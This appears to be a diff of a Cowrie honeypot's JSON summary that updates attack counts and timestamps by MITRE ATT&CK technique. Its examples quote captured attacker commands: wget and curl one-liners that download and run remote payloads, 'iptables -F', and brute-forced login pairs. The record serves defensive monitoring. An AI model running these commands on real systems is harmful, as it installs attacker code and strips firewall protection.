@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-12 21:03:44",
+  "generated": "2026-08-12 22:00:44",
   "totals": {
-    "commands": 2002,
-    "login_failed": 3457,
-    "login_success": 174,
-    "sessions": 3762
+    "commands": 2052,
+    "login_failed": 3527,
+    "login_success": 178,
+    "sessions": 3842
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3457,
+      "count": 3527,
       "examples": [
         "developer / developer",
         "git / 123",
@@ -21,8 +21,8 @@
         "root / 123456789"
       ],
       "first": "2026-08-12T00:00:08.927391Z",
-      "last": "2026-08-12T21:03:13.745198Z",
-      "unique_ips": 138
+      "last": "2026-08-12T22:00:29.757126Z",
+      "unique_ips": 141
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 290,
+      "count": 312,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-12T00:23:37.910058Z",
-      "last": "2026-08-12T20:21:35.902235Z",
-      "unique_ips": 42
+      "last": "2026-08-12T21:48:04.307050Z",
+      "unique_ips": 44
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 174,
+      "count": 178,
       "examples": [
         "root / founder88",
         "enable\\x00 / system\\x00",
@@ -69,8 +69,8 @@
         "root / root123456"
       ],
       "first": "2026-08-12T00:03:28.431265Z",
-      "last": "2026-08-12T20:21:03.172344Z",
-      "unique_ips": 108
+      "last": "2026-08-12T21:59:29.111181Z",
+      "unique_ips": 111
     },
     {
       "id": "T1082",
@@ -184,13 +184,13 @@
       "id": "T1562.004",
       "name": "Impair Defenses: Disable or Modify System Firewall",
       "tactic": "Defense Evasion",
-      "count": 8,
+      "count": 10,
       "examples": [
         "iptables -F"
       ],
       "first": "2026-08-12T01:40:25.516032Z",
-      "last": "2026-08-12T17:55:31.726880Z",
-      "unique_ips": 8
+      "last": "2026-08-12T21:48:00.109245Z",
+      "unique_ips": 10
     },
     {
       "id": "T1070.004",
@@ -233,31 +233,31 @@
   "unmapped": [
     [
       "/bin/busybox",
-      410
+      416
     ],
     [
       "sh",
-      71
+      75
     ],
     [
       "shell",
-      62
+      66
     ],
     [
       "enable",
-      54
+      56
     ],
     [
       "system",
-      54
+      56
     ],
     [
       "linuxshell",
-      42
+      44
     ],
     [
       "ping ;sh",
-      29
+      31
     ],
     [
       "/bin/busybox ECCHI",
